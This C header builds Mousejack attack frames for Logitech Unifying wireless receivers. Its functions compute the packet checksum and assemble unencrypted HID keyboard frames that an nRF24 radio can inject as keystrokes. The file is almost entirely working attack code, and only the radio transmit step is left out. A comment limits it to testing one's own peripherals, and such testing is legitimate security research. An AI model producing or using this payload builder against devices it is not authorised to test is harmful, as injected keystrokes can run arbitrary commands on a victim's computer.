// Pure Mousejack / Logitech Unifying frame codec — host-testable.
// The Mousejack class of bugs lets an nRF24 inject keystrokes into unencrypted
// 2.4 GHz keyboard/mouse dongles. This file builds the HID-keyboard payload and
// its checksum; the nRF24 ESB address-sniff + retransmit is bring-up.
// For testing your own peripherals only.
#pragma once
#include <stdint.h>

// Logitech Unifying packet checksum: every byte (payload + this checksum) sums
// to zero modulo 256, i.e. checksum = two's complement of the payload sum.
static inline uint8_t unifying_checksum(const uint8_t *p, int len) {
  uint8_t sum = 0;
  for (int i = 0; i < len - 1; i++) sum = (uint8_t)(sum + p[i]);
  return (uint8_t)(-(int)sum);
}

// Build a 10-byte Unifying HID keyboard frame (device idx, USB modifier byte,
// one HID usage code) and fill its trailing checksum.
#define UNIFYING_KBD_LEN 10
static inline void mousejack_key(uint8_t dev, uint8_t mods, uint8_t hid_key,
                                 uint8_t out[UNIFYING_KBD_LEN]) {
  out[0] = dev;
  out[1] = 0xC1;                 // frame type: HID keyboard
  out[2] = mods;
  out[3] = hid_key;
  for (int i = 4; i < 9; i++) out[i] = 0x00;   // keys 2..6 unused
  out[9] = unifying_checksum(out, UNIFYING_KBD_LEN);
}
